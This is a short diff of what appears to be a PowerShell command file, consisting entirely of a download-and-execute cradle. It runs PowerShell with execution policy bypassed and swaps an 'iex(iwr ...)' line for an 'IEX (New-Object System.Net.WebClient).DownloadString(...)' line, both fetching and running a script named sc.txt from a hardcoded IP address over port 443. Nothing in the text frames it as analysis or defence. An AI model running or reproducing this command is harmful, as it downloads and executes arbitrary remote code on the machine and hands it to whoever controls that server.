@@ -1,3 +1,3 @@
 powershell -exec bypass
 
-iex(iwr http://87.239.111.217:443/sc.txt -usebasicparsing)
+IEX (New-Object System.Net.WebClient).DownloadString("http://87.239.111.217:443/sc.txt") 
